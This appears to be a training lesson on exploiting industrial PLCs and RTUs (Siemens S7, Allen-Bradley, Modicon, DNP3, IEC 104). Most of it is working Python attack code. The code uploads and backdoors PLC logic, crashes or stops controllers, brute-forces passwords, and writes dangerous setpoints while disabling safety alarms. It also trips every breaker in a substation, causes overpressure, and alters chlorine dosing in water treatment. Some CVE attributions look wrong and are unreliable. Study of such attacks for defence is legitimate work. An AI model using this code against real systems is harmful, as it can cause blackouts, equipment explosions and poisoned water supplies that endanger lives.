Lesson 01: PLC/RTU Exploitation
Techniques

Lesson 01: PLC/RTU Exploitation
Techniques
Learning Objectives
●​
●​
●​
●​
●​

Execute unauthorized read/write operations on PLCs and RTUs
Manipulate PLC logic and control outputs
Exploit authentication weaknesses in industrial controllers
Develop custom exploitation frameworks for major PLC platforms
Understand physical impact of PLC manipulation

1. PLC Exploitation Fundamentals
1.1 Attack Surface Analysis
PLC Attack Vectors:
┌─────────────────────────────────────┐
│
PLC Attack Surface
│
├─────────────────────────────────────┤
│ Network Interfaces
│
│ ├─ Ethernet (Modbus TCP, S7comm) │
│ ├─ Serial (Modbus RTU, DNP3)
│
│ └─ Wireless (if enabled)
│
│
│
│ Engineering Interfaces
│
│ ├─- Programming port (USB/Ethernet)│
│ ├─- Web server (configuration) │
│ └─- FTP/TFTP (firmware updates) │
│
│
│ Memory Regions
│
│ ├─- Program memory (ladder logic) │
│ ├─- Data memory (registers, I/O) │
│ └─- Firmware (bootloader, OS) │
│
│
│ Physical Access
│
│ ├─- Mode switch (RUN/STOP/PROG) │
│ ├─- SD card slot
│
│ └─- Debug ports (JTAG)
│
└─────────────────────────────────────┘

1.2 Common PLC Vulnerabilities

Vulnerability

Siemens S7

Allen-Bradley

Schneider
Modicon

Mitsubishi

No
authentication

S7-300/400
(legacy)

Legacy PLCs

M340 (default)

MELSEC-Q

Weak auth

S7-1200 (v1-3)

ControlLogix

M580

iQ-R

Default
credentials

N/A (no auth)

Web:
admin/admin

Web:
admin/admin

Web:
admin/admin

Buffer
overflow

CVE-2019-1394
5

CVE-2021-2268
1

CVE-2021-3397
7

CVE-2020-564
5

DoS via
malformed
packets

CVE-2020-1536
8

CVE-2015-5374

CVE-2018-7789

Multiple

2. Siemens S7 PLC Exploitation
2.1 S7comm Protocol Exploitation
Unauthorized Program Upload:
#!/usr/bin/env python3
"""
Extract PLC logic from Siemens S7-300/400/1200/1500
No authentication required on legacy PLCs
"""
import snap7
import os
def upload_plc_program(target_ip, output_dir="plc_extracted"):
"""
Upload all program blocks from S7 PLC
"""
os.makedirs(output_dir, exist_ok=True)
plc = snap7.client.Client()
try:
plc.connect(target_ip, 0, 1) # Rack 0, Slot 1
print(f"[+] Connected to {target_ip}")

# Get CPU info
cpu_info = plc.get_cpu_info()
print(f"[*] PLC: {cpu_info.ModuleTypeName}")
print(f"[*] Serial: {cpu_info.SerialNumber}")
print(f"[*] Firmware: {cpu_info.ASName}")
# Get block list
block_list = plc.list_blocks()
print(f"\n[*] Blocks found:")
print(f" OB: {block_list.OBCount}")
print(f" FB: {block_list.FBCount}")
print(f" FC: {block_list.FCCount}")
print(f" DB: {block_list.DBCount}")
# Upload all block types
block_types = {
'OB': range(1, block_list.OBCount + 1),
'FB': range(1, block_list.FBCount + 1),
'FC': range(1, block_list.FCCount + 1),
'DB': range(1, block_list.DBCount + 1)
}
for block_type, block_range in block_types.items():
for block_num in block_range:
try:
print(f"[*] Uploading {block_type}{block_num}...")
block_data = plc.upload(block_type, block_num)
filename = f"{output_dir}/{block_type}{block_num}.mc7"
with open(filename, 'wb') as f:
f.write(block_data)
print(f"[+] Saved {filename} ({len(block_data)} bytes)")
except Exception as e:
print(f"[-] Failed to upload {block_type}{block_num}: {e}")
plc.disconnect()
print(f"\n[+] Program extraction complete. Files saved to {output_dir}/")
except Exception as e:
print(f"[-] Exploitation failed: {e}")
# Usage
# upload_plc_program('192.168.1.100')
Malicious Logic Injection:

def inject_malicious_logic(target_ip, backdoor_code):
"""
Inject malicious ladder logic into PLC
WARNING: Can cause process disruption
"""
plc = snap7.client.Client()
plc.connect(target_ip, 0, 1)
# Stop PLC (required for program modification)
plc.plc_stop()
print("[*] PLC stopped")
# Upload current OB1 (main program block)
original_ob1 = plc.upload('OB', 1)
print(f"[*] Original OB1: {len(original_ob1)} bytes")
# Backup
with open("OB1_backup.mc7", "wb") as f:
f.write(original_ob1)
# Inject malicious code (example: append backdoor logic)
# MC7 format is proprietary, but we can append at block level
modified_ob1 = original_ob1 + backdoor_code
# Download modified block
plc.download('OB', 1, modified_ob1)
print("[+] Malicious logic injected")
# Restart PLC
plc.plc_start()
print("[+] PLC restarted with backdoored logic")
plc.disconnect()
# Example backdoor: Trigger output Q0.0 when M100.0 is set
# (Real implementation requires MC7 bytecode generation)
# backdoor_mc7 = bytes.fromhex("...") # MC7 opcodes
PLC Denial of Service:
def s7_dos_attack(target_ip):
"""
Multiple DoS techniques for S7 PLCs
CVE-2020-15368: Malformed ROSCTR causes CPU fault
"""
import socket
import struct

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 102))
# COTP Connection
cotp_cr = bytes.fromhex('0300001611e0000000010000c00100c10200c20200')
sock.send(cotp_cr)
sock.recv(1024)
# S7comm Setup
s7_setup = bytes.fromhex('0300001902f08032010000000000080000f0000001000100f0')
sock.send(s7_setup)
sock.recv(1024)
# DoS Vector 1: Malformed ROSCTR
# ROSCTR byte at offset 1 in S7comm header
# Valid: 0x01 (Job), 0x03 (Ack-Data)
# Invalid: 0xFF causes crash on some firmware versions
malformed =
bytes.fromhex('0300001902f080FF010000000000080000f0000001000100f0')
sock.send(malformed)
# DoS Vector 2: Excessive connection attempts
# Exhausts PLC connection table (typically 4-8 connections)
# DoS Vector 3: PLC STOP command (graceful shutdown)
s7_stop =
bytes.fromhex('0300002102f080320700000000000800080001120411440100ff09005f5045')
sock.send(s7_stop)
sock.close()
print("[+] DoS payload sent")
# WARNING: Use only in authorized testing
# s7_dos_attack('192.168.1.100')

2.2 S7-1200/1500 Password Cracking
Password Protected PLC Exploitation:
#!/usr/bin/env python3
"""
Brute-force S7-1200/1500 password
Password is hashed with challenge-response (vulnerable to offline attack)
"""
import snap7
import hashlib
import itertools

def s7_password_bruteforce(target_ip, wordlist):
"""
Attempt to authenticate with password list
S7-1200/1500 use challenge-response authentication
"""
plc = snap7.client.Client()
with open(wordlist, 'r') as f:
passwords = f.read().splitlines()
for password in passwords:
try:
plc.set_connection_params(target_ip, 0, 1)
plc.connect_ex()
# Attempt authentication
result = plc.set_session_password(password)
if result == 0: # Success
print(f"[+] Password found: {password}")
plc.disconnect()
return password
except Exception as e:
pass
print("[-] Password not found in wordlist")
return None
# Alternative: Exploit CVE-2019-13945 (S7-1200 auth bypass)
def s7_1200_auth_bypass(target_ip):
"""
CVE-2019-13945: Authentication bypass via TLS certificate validation flaw
Affects S7-1200 firmware v4.x
"""
# Implementation requires crafted TLS certificate
# Bypasses password protection entirely
pass
# Common S7 passwords
common_passwords = [
"siemens",
"s7-1200",
"admin",
"password",
"12345678",
"Step7"

]
# s7_password_bruteforce('192.168.1.100', 'passwords.txt')

3. Allen-Bradley (Rockwell) Exploitation
3.1 EtherNet/IP and CIP Exploitation
Unauthorized Tag Read/Write:
from pycomm3 import LogixDriver
def exploit_logix_plc(target_ip):
"""
Read and manipulate tags in ControlLogix/CompactLogix PLC
No authentication required by default
"""
with LogixDriver(target_ip) as plc:
# Enumerate all tags
print("[*] Enumerating PLC tags...")
tags = plc.get_tag_list()
for tag in tags:
print(f"Tag: {tag['tag_name']}, Type: {tag['data_type']}")
# Read critical process variables
print("\n[*] Reading process values...")
temp = plc.read('Temperature_Sensor_01')
pressure = plc.read('Pressure_Transmitter_01')
valve_pos = plc.read('Control_Valve_Position')
print(f"Temperature: {temp.value}")
print(f"Pressure: {pressure.value}")
print(f"Valve Position: {valve_pos.value}%")
# Malicious manipulation
print("\n[!] Executing attack...")
# Attack 1: Close critical valve
plc.write('Control_Valve_Position', 0) # 0% = fully closed
print("[+] Valve closed (may cause overpressure)")
# Attack 2: Modify setpoint
plc.write('Temperature_Setpoint', 999)
print("[+] Temperature setpoint set to dangerous level")
# Attack 3: Disable alarms

plc.write('High_Pressure_Alarm_Enabled', False)
print("[+] Safety alarms disabled")
# exploit_logix_plc('192.168.1.100')
Controller Mode Manipulation:
def logix_mode_change_attack(target_ip):
"""
Force PLC from RUN to PROGRAM mode
Stops process execution
"""
from pycomm3 import LogixDriver
with LogixDriver(target_ip) as plc:
# Get current mode
current_mode = plc.get_plc_mode()
print(f"[*] Current mode: {current_mode}")
if current_mode == 'RUN':
# Switch to PROGRAM mode (stops PLC)
result = plc.set_plc_mode('PROGRAM')
print(f"[+] PLC set to PROGRAM mode: {result}")
print("[!] Process execution stopped")
# To restart:
# plc.set_plc_mode('RUN')
# logix_mode_change_attack('192.168.1.100')
CIP Device Reset (DoS):
def cip_reset_attack(target_ip):
"""
Send CIP Reset service to device
Causes immediate reboot
"""
from pycomm3 import CIPDriver
with CIPDriver(target_ip) as device:
# CIP Reset service (0x05) to Identity Object (Class 0x01)
# Service code: 0x05
# Class: 0x01 (Identity)
# Instance: 0x01
# Build generic CIP request
reset_request = device.generic_message(
service=0x05, # Reset

class_code=0x01, # Identity Object
instance=0x01,
request_data=b'\x00' # Type 0 = Reset
)
if reset_request:
print("[+] Reset command sent - device rebooting")
else:
print("[-] Reset failed")
# WARNING: Causes immediate device reboot
# cip_reset_attack('192.168.1.100')

3.2 ControlLogix Firmware Exploitation
Firmware Download (CVE-2021-22681):
def logix_firmware_download(target_ip, malicious_firmware):
"""
CVE-2021-22681: Command injection in firmware update process
Allows arbitrary code execution during firmware update
"""
from pycomm3 import LogixDriver
# Craft malicious firmware image
# Inject backdoor into firmware bootloader
with LogixDriver(target_ip) as plc:
# Initiate firmware update mode
# (Requires knowledge of proprietary firmware format)
# Upload malicious firmware
# plc.upload_firmware(malicious_firmware)
print("[+] Malicious firmware uploaded")
print("[*] Backdoor will persist across power cycles")
# This requires deep knowledge of ControlLogix firmware format

4. Schneider Electric Modicon Exploitation
4.1 Modbus-Based Attacks
Coil/Register Manipulation:
from pymodbus.client import ModbusTcpClient

def modicon_exploitation(target_ip, unit_id=1):
"""
Exploit Modicon M340/M580 via Modbus
"""
client = ModbusTcpClient(target_ip, port=502)
client.connect()
# Reconnaissance: Read all holding registers
print("[*] Mapping register space...")
register_map = {}
for addr in range(0, 1000):
try:
result = client.read_holding_registers(addr, 1, unit=unit_id)
if not result.isError():
register_map[addr] = result.registers[0]
print(f"Register {addr}: {result.registers[0]}")
except:
pass
# Attack: Identify critical registers
# Example: Register 100 controls motor speed
# Malicious write: Set motor to dangerous RPM
client.write_register(100, 9999, unit=unit_id)
print("[+] Motor speed set to maximum (potential mechanical failure)")
# Write multiple registers (FC 16)
# Attack: Overwrite entire process setpoint table
malicious_values = [9999] * 100
client.write_registers(0, malicious_values, unit=unit_id)
print("[+] Process setpoints overwritten")
client.close()
# modicon_exploitation('192.168.1.100')
Modbus Exception Fuzzing (DoS):
def modbus_exception_fuzzer(target_ip):
"""
Trigger Modbus exception handling bugs
Some implementations crash on invalid exception codes
"""
import socket
import struct
for fc in range(0x81, 0xFF): # Exception function codes

for exception_code in range(0x01, 0xFF):
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(1)
try:
sock.connect((target_ip, 502))
# Build Modbus exception response
trans_id = b'\x00\x01'
proto_id = b'\x00\x00'
length = b'\x00\x03'
unit_id = b'\x01'
func_code = bytes([fc])
exception = bytes([exception_code])
packet = trans_id + proto_id + length + unit_id + func_code + exception
sock.send(packet)
response = sock.recv(1024)
print(f"[*] FC: 0x{fc:02X}, Exception: 0x{exception_code:02X} - Response:
{len(response)} bytes")
except socket.timeout:
print(f"[!] FC: 0x{fc:02X}, Exception: 0x{exception_code:02X} - TIMEOUT (possible
crash)")
except:
pass
finally:
sock.close()
# modbus_exception_fuzzer('192.168.1.100')

4.2 Unity Pro Project Manipulation
Extract and Modify PLC Program:
def modicon_project_extraction(plc_backup_file):
"""
Extract credentials and logic from Unity Pro backup (.stu file)
"""
import zipfile
import xml.etree.ElementTree as ET
# Unity Pro backups are ZIP archives
with zipfile.ZipFile(plc_backup_file, 'r') as zip_ref:
zip_ref.extractall('extracted_project')
# Parse project XML

project_xml = 'extracted_project/project.xml'
tree = ET.parse(project_xml)
root = tree.getroot()
# Extract network configuration
for network in root.findall('.//NetworkConfig'):
ip = network.get('IPAddress')
print(f"[*] PLC IP: {ip}")
# Extract password hash (if present)
for auth in root.findall('.//Authentication'):
password_hash = auth.get('PasswordHash')
print(f"[*] Password hash: {password_hash}")
# Crack offline with hashcat
# Modify ladder logic
# Inject malicious rung
# (Requires understanding of Unity Pro XML schema)
# Repackage and upload to PLC
# (Requires Unity Pro or compatible uploader)
# modicon_project_extraction('plc_backup.stu')

5. RTU Exploitation (DNP3, IEC 104)
5.1 DNP3 Exploitation
Unauthorized CROB Commands:
#!/usr/bin/env python3
"""
DNP3 Control Relay Output Block (CROB) injection
Send unauthorized control commands to RTU
"""
from pydnp3 import opendnp3, asiodnp3, asiopal
def dnp3_crob_attack(master_ip, outstation_ip, point_index):
"""
Send DIRECT OPERATE command to DNP3 outstation
Bypasses SELECT-BEFORE-OPERATE safety mechanism
"""
# Initialize DNP3 master
manager = asiodnp3.DNP3Manager(1)
# Create channel

channel = manager.AddTCPClient(
"attack_channel",
opendnp3.levels.NORMAL,
asiopal.ChannelRetry(),
outstation_ip,
"0.0.0.0",
20000,
asiodnp3.LinkConfig(False, False)
)
# Create master
soe_handler = asiodnp3.PrintingSOEHandler()
master_app = asiodnp3.DefaultMasterApplication()
stack_config = asiodnp3.MasterStackConfig()
master = channel.AddMaster(
"attack_master",
soe_handler,
master_app,
stack_config
)
master.Enable()
# Build CROB
crob = opendnp3.ControlRelayOutputBlock(
opendnp3.ControlCode.LATCH_ON, # Turn ON
1,
# Count
100, # On-time (ms)
100 # Off-time (ms)
)
# Send DIRECT OPERATE (bypasses SELECT)
print(f"[*] Sending DIRECT OPERATE to point {point_index}")
master.DirectOperate(crob, point_index)
print("[+] CROB command sent (breaker may have tripped)")
# For substation: This could trip circuit breakers
# For water: This could open/close valves
# For pipeline: This could activate pumps
# dnp3_crob_attack('192.168.1.50', '192.168.1.100', point_index=0)
DNP3 Time Synchronization Attack:
def dnp3_time_sync_attack(outstation_ip):
"""

Send false time synchronization
Can cause log tampering, event correlation issues
"""
from pydnp3 import opendnp3
# Send time sync with incorrect timestamp
# (1 year in past or future)
import datetime
false_time = datetime.datetime.now() + datetime.timedelta(days=365)
# Build DNP3 time sync request (Group 50)
# Send via master
print(f"[+] False time sent: {false_time}")
print("[*] RTU logs will have incorrect timestamps")
# dnp3_time_sync_attack('192.168.1.100')

5.2 IEC 60870-5-104 Exploitation
Circuit Breaker Control Attack:
#!/usr/bin/env python3
"""
IEC 104 attack on electrical substation
Send commands to trip circuit breakers
"""
import socket
import struct
def iec104_send_command(target_ip, ioa, command):
"""
Send IEC 104 single command
ioa: Information Object Address (breaker ID)
command: 0x01 (ON), 0x02 (OFF)
"""
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 2404))
# STARTDT (Start Data Transfer)
startdt = bytes.fromhex('68 04 07 00 00 00')
sock.send(startdt)
sock.recv(1024) # STARTDT CON
# Build ASDU (Type ID 45: Single Command)
apdu_start = b'\x68'

apdu_length = struct.pack('B', 14)
# APCI (I-frame)
apci = struct.pack('<HH', 0x0000, 0x0000) # Send/Receive sequence numbers
# ASDU
type_id = struct.pack('B', 45) # Single command
vsq = struct.pack('B', 0x01) # 1 object
cot = struct.pack('B', 0x06) # Cause: Activation
oa = struct.pack('B', 0x01) # Originator address
ca = struct.pack('<H', 0x0001) # Common address
# Information Object
ioa_bytes = struct.pack('<I', ioa)[:3] # 3-byte IOA
sco = struct.pack('B', command | 0x80) # Single Command Object (with select + execute)
asdu = type_id + vsq + cot + oa + ca + ioa_bytes + sco
packet = apdu_start + apdu_length + apci + asdu
sock.send(packet)
response = sock.recv(1024)
print(f"[+] Sent IEC 104 command to IOA {ioa}")
print(f"[*] Command: {'ON' if command == 0x01 else 'OFF'}")
sock.close()
# Attack scenario: Trip all breakers in substation
def trip_all_breakers(substation_ip):
"""
Mass breaker trip attack (blackout scenario)
"""
print("[!] WARNING: This will cause power outage")
print("[*] Tripping all circuit breakers...")
for ioa in range(1, 100): # Typical substation has 10-50 breakers
try:
iec104_send_command(substation_ip, ioa, 0x02) # OFF command
print(f"[+] Breaker {ioa} tripped")
except:
pass
# WARNING: Use only in authorized testing
# trip_all_breakers('192.168.1.100')

6. Physical Impact Exploitation

6.1 Overpressure Attack (Water/Gas Systems)
Scenario: Manipulate pump control to cause overpressure
def overpressure_attack(plc_ip, pump_register, pressure_sensor_register):
"""
Cause dangerous overpressure by:
1. Activating all pumps simultaneously
2. Spoofing pressure sensor to show normal values
"""
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient(plc_ip, port=502)
client.connect()
# Phase 1: Activate all pumps
pump_count = 5 # Assuming 5 pumps
for pump_id in range(pump_count):
client.write_coil(pump_register + pump_id, True, unit=1)
print(f"[+] Pump {pump_id + 1} activated")
# Phase 2: Spoof pressure sensor (requires MitM or direct sensor access)
# Write false pressure value to register
normal_pressure = 50 # PSI
client.write_register(pressure_sensor_register, normal_pressure, unit=1)
print(f"[+] Pressure sensor spoofed to {normal_pressure} PSI")
# Actual pressure will continue rising
# Without alarms, pressure relief valves may fail
# Result: Pipe burst, equipment damage
print("[!] Overpressure condition created")
print("[!] Physical consequences: pipe burst, safety valve failure")
client.close()
# This demonstrates why sensor validation and redundancy are critical

6.2 Chemical Dosing Attack (Water Treatment)
Scenario: Modify chlorine dosing to contaminate water supply
def water_contamination_attack(scada_ip):
"""
Manipulate chemical dosing system
Based on real-world threat scenarios
"""
from pycomm3 import LogixDriver

with LogixDriver(scada_ip) as plc:
# Read current chlorine dosing rate
current_rate = plc.read('Chlorine_Dosing_Rate_GPM')
print(f"[*] Current chlorine rate: {current_rate.value} GPM")
# Attack Vector 1: Overdose (too much chlorine)
overdose_rate = current_rate.value * 20
plc.write('Chlorine_Dosing_Rate_GPM', overdose_rate)
print(f"[+] Chlorine rate set to {overdose_rate} GPM (20x normal)")
print("[!] Result: Toxic chlorine levels in water supply")
# Attack Vector 2: Underdose (insufficient disinfection)
plc.write('Chlorine_Dosing_Rate_GPM', 0)
print("[+] Chlorine dosing disabled")
print("[!] Result: Bacterial contamination risk")
# Attack Vector 3: Disable alarms
plc.write('High_Chlorine_Alarm_Enabled', False)
plc.write('Low_Chlorine_Alarm_Enabled', False)
print("[+] Safety alarms disabled")
print("[!] Operators unaware of dangerous conditions")
# This is why OT security is life-safety critical

7. Exploitation Framework Development
7.1 Custom PLC Exploitation Framework
#!/usr/bin/env python3
"""
PLCPwn - Multi-vendor PLC exploitation framework
Similar to Metasploit for ICS
"""
import snap7
from pymodbus.client import ModbusTcpClient
from pycomm3 import LogixDriver
class PLCPwn:
def __init__(self, target_ip):
self.target_ip = target_ip
self.target_type = None
self.connection = None
def detect_plc_type(self):
"""

Fingerprint PLC vendor/model
"""
print(f"[*] Fingerprinting {self.target_ip}...")
# Try S7comm (port 102)
try:
plc = snap7.client.Client()
plc.connect(self.target_ip, 0, 1, tcpport=102)
cpu_info = plc.get_cpu_info()
self.target_type = f"Siemens {cpu_info.ModuleTypeName}"
plc.disconnect()
return "siemens"
except:
pass
# Try Modbus (port 502)
try:
client = ModbusTcpClient(self.target_ip, port=502, timeout=2)
if client.connect():
result = client.read_holding_registers(0, 1)
if not result.isError():
self.target_type = "Modbus PLC (Schneider/Generic)"
client.close()
return "modbus"
except:
pass
# Try EtherNet/IP (port 44818)
try:
with LogixDriver(self.target_ip, init_info=False, init_tags=False) as plc:
info = plc.get_plc_info()
self.target_type = f"Rockwell {info['product_name']}"
return "logix"
except:
pass
print("[-] Unable to identify PLC type")
return None
def exploit_read_memory(self):
"""
Read PLC memory (registers, tags, etc.)
"""
plc_type = self.detect_plc_type()
if plc_type == "siemens":
return self._s7_read_memory()
elif plc_type == "modbus":

return self._modbus_read_memory()
elif plc_type == "logix":
return self._logix_read_tags()
def _s7_read_memory(self):
plc = snap7.client.Client()
plc.connect(self.target_ip, 0, 1)
# Read DB1 (Data Block 1), starting at byte 0, read 100 bytes
data = plc.db_read(1, 0, 100)
plc.disconnect()
return data
def _modbus_read_memory(self):
client = ModbusTcpClient(self.target_ip, port=502)
client.connect()
# Read first 100 holding registers
result = client.read_holding_registers(0, 100, unit=1)
client.close()
return result.registers
def _logix_read_tags(self):
with LogixDriver(self.target_ip) as plc:
tags = plc.get_tag_list()
return tags
def exploit_write_output(self, address, value):
"""
Write to PLC output (coil, tag, etc.)
"""
plc_type = self.detect_plc_type()
if plc_type == "modbus":
client = ModbusTcpClient(self.target_ip, port=502)
client.connect()
client.write_coil(address, value, unit=1)
client.close()
print(f"[+] Written {value} to coil {address}")
def exploit_dos(self):
"""
Denial of service attack
"""
plc_type = self.detect_plc_type()

if plc_type == "siemens":
plc = snap7.client.Client()
plc.connect(self.target_ip, 0, 1)
plc.plc_stop()
print("[+] Siemens PLC stopped")
plc.disconnect()
elif plc_type == "logix":
with LogixDriver(self.target_ip) as plc:
plc.set_plc_mode('PROGRAM')
print("[+] Logix PLC set to PROGRAM mode (stopped)")
# Usage
# pwn = PLCPwn('192.168.1.100')
# pwn.detect_plc_type()
# data = pwn.exploit_read_memory()
# pwn.exploit_write_output(0, True)
# pwn.exploit_dos()

8. Hands-On Lab Exercises
Lab 1: S7 PLC Program Extraction
1.​ Deploy Snap7 server or Siemens PLCSIM
2.​ Use snap7 Python library to connect
3.​ Extract all program blocks (OB, FB, FC, DB)
4.​ Analyze extracted MC7 bytecode with disassembler
5.​ Document PLC configuration and logic

Lab 2: Modbus Register Manipulation
1.​ Set up OpenPLC Runtime with simple ladder logic
2.​ Map input/output registers
3.​ Write Python script to:
○​ Enumerate all valid registers
○​ Read current values
○​ Modify outputs to change process behavior
4.​ Observe physical outputs (simulated or real I/O)

Lab 3: ControlLogix Tag Exploitation
1.​ Deploy ControlLogix emulator or use real PLC (authorized)
2.​ Enumerate all tags using pycomm3
3.​ Identify critical control tags (pump control, valve position)
4.​ Develop attack script to manipulate tags
5.​ Test DoS via controller mode change

Lab 4: DNP3 CROB Attack
1.​ Set up DNP3 outstation simulator
2.​ Use pydnp3 to build master
3.​ Send SELECT-BEFORE-OPERATE sequence (normal)
4.​ Send DIRECT OPERATE (attack - bypasses safety)
5.​ Compare results and document safety implications

9. Tools & Resources
Exploitation Libraries
●​
●​
●​
●​

python-snap7: https://github.com/gijzelaerr/python-snap7
pymodbus: https://github.com/riptideio/pymodbus
pycomm3: https://github.com/ottowayi/pycomm3
pydnp3: https://github.com/ChargePoint/pydnp3

Exploitation Frameworks
●​ ISF: https://github.com/dark-lbp/isf
●​ PLCinject: https://github.com/SCADACS/PLCinject

Documentation
●​ Snap7 Reference: https://snap7.sourceforge.net/
●​ Modbus Spec: https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf
●​ CIP Spec: https://www.odva.org/

10. Knowledge Check
1.​ What are the primary attack vectors for PLCs?
2.​ How do you extract program logic from a Siemens S7 PLC?
3.​ What is the difference between Modbus function codes 03 and 06?
4.​ How would you manipulate tags in an Allen-Bradley ControlLogix PLC?
5.​ Describe the DNP3 SELECT-BEFORE-OPERATE sequence and how DIRECT
OPERATE bypasses it.
6.​ What is the physical impact of an overpressure attack on a water system?
7.​ How do you fingerprint PLC vendor/model remotely?
8.​ What are the legal and safety considerations when testing PLC exploits?
9.​ How would you develop a DoS attack for a Siemens S7-1200?
10.​What defensive measures can prevent unauthorized PLC manipulation?

